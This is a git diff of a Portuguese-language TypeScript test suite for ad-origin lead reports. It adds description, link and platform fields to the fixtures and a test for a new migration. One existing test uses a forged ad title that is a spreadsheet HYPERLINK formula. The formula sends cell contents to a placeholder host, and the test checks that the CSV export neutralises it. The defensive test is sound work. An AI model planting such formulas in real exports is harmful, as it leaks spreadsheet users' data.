@@ -78,7 +78,17 @@ function linha(
   titulo: string | null,
   nomeNaMeta: string | null = null,
 ): LinhaDeAnuncioDoPeriodo {
-  return { adId, titulo, nomeNaMeta, leads: 1, agendaram: 0, compareceram: 0 };
+  return {
+    adId,
+    titulo,
+    nomeNaMeta,
+    descricao: null,
+    link: null,
+    plataformas: null,
+    leads: 1,
+    agendaram: 0,
+    compareceram: 0,
+  };
 }
 
 describe("montarDetalheDeOrigem por anúncio", () => {
@@ -144,7 +154,12 @@ describe("montarDetalheDeOrigem por anúncio", () => {
       "anuncio",
       undefined,
       anunciosDoPeriodo({
-        naoIdentificado: { leads: 0, agendaram: 0, compareceram: 0 },
+        naoIdentificado: {
+          leads: 0,
+          agendaram: 0,
+          compareceram: 0,
+          plataformas: [],
+        },
         semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
       }),
     )!;
@@ -166,7 +181,12 @@ describe("montarDetalheDeOrigem por anúncio", () => {
       montarDetalheDeOrigem(FUNIL, "anuncio", undefined, {
         leads: 0,
         linhas: [],
-        naoIdentificado: { leads: 0, agendaram: 0, compareceram: 0 },
+        naoIdentificado: {
+          leads: 0,
+          agendaram: 0,
+          compareceram: 0,
+          plataformas: [],
+        },
         semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
       }),
     ).toEqual([]);
@@ -259,9 +279,7 @@ describe("rotulosDosAnuncios", () => {
 // Os dois anuncios reais no periodo, como a Salud Care vai ver depois da
 // publicacao: nenhum titulo guardado (as mensagens sao de antes) e
 // meta_anuncio vazia.
-function anunciosReais(
-  titulo: string | null = null,
-): AnunciosDoPeriodo {
+function anunciosReais(titulo: string | null = null): AnunciosDoPeriodo {
   return {
     leads: 45,
     linhas: [
@@ -269,6 +287,9 @@ function anunciosReais(
         adId: ANUNCIO_REAL_1,
         titulo,
         nomeNaMeta: null,
+        descricao: null,
+        link: null,
+        plataformas: null,
         leads: 26,
         agendaram: 4,
         compareceram: 2,
@@ -277,12 +298,20 @@ function anunciosReais(
         adId: ANUNCIO_REAL_2,
         titulo,
         nomeNaMeta: null,
+        descricao: null,
+        link: null,
+        plataformas: null,
         leads: 19,
         agendaram: 3,
         compareceram: 1,
       },
     ],
-    naoIdentificado: { leads: 0, agendaram: 0, compareceram: 0 },
+    naoIdentificado: {
+      leads: 0,
+      agendaram: 0,
+      compareceram: 0,
+      plataformas: [],
+    },
     semAnuncio: { leads: 0, agendaram: 0, compareceram: 0 },
   };
 }
@@ -374,7 +403,8 @@ describe("exportação na dimensão Anúncio", () => {
   });
 
   it("título de anúncio que começa como fórmula sai como texto no CSV", () => {
-    const forjado = '=HYPERLINK("https://exemplo.invalid/?d="&A1;"Clique aqui")';
+    const forjado =
+      '=HYPERLINK("https://exemplo.invalid/?d="&A1;"Clique aqui")';
     const csv = gerarCsv(
       linhasDoCsv(
         montarExportavelDaAba(
@@ -385,6 +415,9 @@ describe("exportação na dimensão Anúncio", () => {
                   adId: "120240624148610289",
                   titulo: forjado,
                   nomeNaMeta: null,
+                  descricao: null,
+                  link: null,
+                  plataformas: null,
                   leads: 1,
                   agendaram: 0,
                   compareceram: 0,
@@ -393,6 +426,9 @@ describe("exportação na dimensão Anúncio", () => {
                   adId: "120240624148610290",
                   titulo: "-30% na limpeza de pele",
                   nomeNaMeta: null,
+                  descricao: null,
+                  link: null,
+                  plataformas: null,
                   leads: 1,
                   agendaram: 0,
                   compareceram: 0,
@@ -460,7 +496,9 @@ describe("Detalhe da origem na tela, dimensão Anúncio", () => {
     expect(lido).toContain("Anúncio sem título (id 120240624148610289)");
     expect(lido).toContain("Anúncio sem título (id 120248355615910289)");
     expect(lido).not.toContain("final 0289");
-    const comTitulo = texto(tela({ anuncios: anunciosReais("Avaliação gratuita") }));
+    const comTitulo = texto(
+      tela({ anuncios: anunciosReais("Avaliação gratuita") }),
+    );
     expect(comTitulo).toContain("Avaliação gratuita (id 120240624148610289)");
     expect(comTitulo).toContain("Avaliação gratuita (id 120248355615910289)");
   });
@@ -567,6 +605,8 @@ describe("fetchAnunciosDoPeriodo", () => {
         },
       },
     ]);
+    // O corpo de antes da migration 20261026130000 (sem texto, link nem
+    // plataformas): os campos novos chegam nulos, sem lancar.
     expect(anuncios).toEqual({
       leads: 3,
       linhas: [
@@ -574,12 +614,20 @@ describe("fetchAnunciosDoPeriodo", () => {
           adId: "120240624148610289",
           titulo: "Título",
           nomeNaMeta: null,
+          descricao: null,
+          link: null,
+          plataformas: null,
           leads: 2,
           agendaram: 1,
           compareceram: 0,
         },
       ],
-      naoIdentificado: { leads: 0, agendaram: 0, compareceram: 0 },
+      naoIdentificado: {
+        leads: 0,
+        agendaram: 0,
+        compareceram: 0,
+        plataformas: null,
+      },
       semAnuncio: { leads: 1, agendaram: 1, compareceram: 1 },
     });
     expect(relatoriosKeys.anuncios("c1", "2026-10-01", "2026-10-31")).toEqual([
@@ -589,6 +637,72 @@ describe("fetchAnunciosDoPeriodo", () => {
       "2026-10-01",
       "2026-10-31",
     ]);
+  });
+
+  it("desde a migration 20261026130000: o texto, o link e as plataformas (aparadas; vazia vira nula); soma que não bate vira null", async () => {
+    const { supabase } = cliente({
+      data: {
+        leads: 30,
+        linhas: [
+          {
+            ad_id: "120248355615910289",
+            titulo: "Cuide por apenas R$12,99 ao dia",
+            nome_na_meta: null,
+            descricao: "Plano de saúde a partir de R$12,99.\nFale com a gente.",
+            link: "https://fb.me/cuide",
+            plataformas: [
+              { plataforma: " Instagram ", leads: 18 },
+              { plataforma: "", leads: 5 },
+              { plataforma: null, leads: 2 },
+            ],
+            leads: 25,
+            agendaram: 0,
+            compareceram: 0,
+          },
+          {
+            ad_id: "120240624148610289",
+            titulo: null,
+            nome_na_meta: null,
+            descricao: null,
+            link: null,
+            // 3 + 1 nao fecha os 5 leads: a tela nao mostra a divisao
+            plataformas: [
+              { plataforma: "Facebook", leads: 3 },
+              { plataforma: null, leads: 1 },
+            ],
+            leads: 5,
+            agendaram: 0,
+            compareceram: 0,
+          },
+        ],
+        nao_identificado: {
+          leads: 0,
+          agendaram: 0,
+          compareceram: 0,
+          plataformas: [],
+        },
+        sem_anuncio: { leads: 0, agendaram: 0, compareceram: 0 },
+      },
+      error: null,
+    });
+    const anuncios = await fetchAnunciosDoPeriodo(
+      supabase,
+      "c1",
+      "America/Fortaleza",
+      "2026-10-01",
+      "2026-10-31",
+    );
+    expect(anuncios.linhas[0]).toMatchObject({
+      descricao: "Plano de saúde a partir de R$12,99.\nFale com a gente.",
+      link: "https://fb.me/cuide",
+      plataformas: [
+        { plataforma: "Instagram", leads: 18 },
+        { plataforma: null, leads: 5 },
+        { plataforma: null, leads: 2 },
+      ],
+    });
+    expect(anuncios.linhas[1]?.plataformas).toBeNull();
+    expect(anuncios.naoIdentificado.plataformas).toEqual([]);
   });
 
   it("null (profissional) e erro viram erro, nunca tabela vazia", async () => {
